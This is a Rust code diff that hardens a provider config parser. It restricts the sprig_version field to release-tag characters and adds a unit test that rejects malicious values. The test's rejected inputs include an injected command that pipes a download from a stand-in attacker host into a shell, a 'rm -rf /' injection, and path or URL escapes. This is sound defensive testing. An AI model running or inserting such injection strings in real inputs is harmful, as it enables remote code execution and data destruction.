@@ -137,6 +137,23 @@ pub fn parse(cfg: &serde_json::Value) -> Result<ProviderConfig, String> {
         Some(n) => Some(n),
     };
 
+    // The version becomes a path segment of the release-asset URL that a
+    // provisioning shell fetches. Tag characters only: anything else is
+    // either a URL-shape escape (`/`, `?`, `#`) or shell-active (`$`,
+    // backtick, quotes, spaces) — and this field is the one provision input
+    // an agent's owner types freely.
+    let sprig_version = optional_string(cfg, "sprig_version")?
+        .unwrap_or_else(|| DEFAULT_SPRIG_VERSION.to_string());
+    if !sprig_version
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
+    {
+        return Err(format!(
+            "provider_config.sprig_version {sprig_version:?} is not a release \
+             tag: expected only ASCII letters, digits, '.', '_', or '-'"
+        ));
+    }
+
     let sprig_sha256 = optional_string(cfg, "sprig_sha256")?;
     if let Some(sha) = &sprig_sha256 {
         if sha.len() != 64 || !sha.chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
@@ -151,8 +168,7 @@ pub fn parse(cfg: &serde_json::Value) -> Result<ProviderConfig, String> {
     Ok(ProviderConfig {
         org: optional_string(cfg, "org")?,
         inactivity_seconds,
-        sprig_version: optional_string(cfg, "sprig_version")?
-            .unwrap_or_else(|| DEFAULT_SPRIG_VERSION.to_string()),
+        sprig_version,
         sprig_sha256,
         install_claude_adapter: optional_bool(cfg, "install_claude_adapter")?.unwrap_or(true),
         install_codex_adapter: optional_bool(cfg, "install_codex_adapter")?.unwrap_or(true),
@@ -253,6 +269,32 @@ mod tests {
         assert!(err.contains("inactivity_seconds"), "{err}");
         let err = parse(&json!({"inactivity_seconds": -5})).unwrap_err();
         assert!(err.contains("non-negative"), "{err}");
+    }
+
+    /// The version reaches a provisioning shell inside a download URL, so
+    /// its grammar is a security boundary, not a formality: a value that
+    /// carries shell substitution or URL structure must be refused at parse.
+    #[test]
+    fn sprig_version_must_be_release_tag_shaped() {
+        for good in ["sprig-latest", "v1.2.3", "sprig_v0.2.0-rc.1"] {
+            assert_eq!(
+                parse(&json!({"sprig_version": good})).unwrap().sprig_version,
+                good
+            );
+        }
+        for bad in [
+            "$(curl evil.example|sh)",
+            "`boom`",
+            "a b",
+            "v1;rm -rf /",
+            "../other-repo",
+            "tag?x=1",
+            "tag\"",
+            "tag'",
+        ] {
+            let err = parse(&json!({"sprig_version": bad})).unwrap_err();
+            assert!(err.contains("sprig_version"), "{bad:?}: {err}");
+        }
     }
 
     #[test]
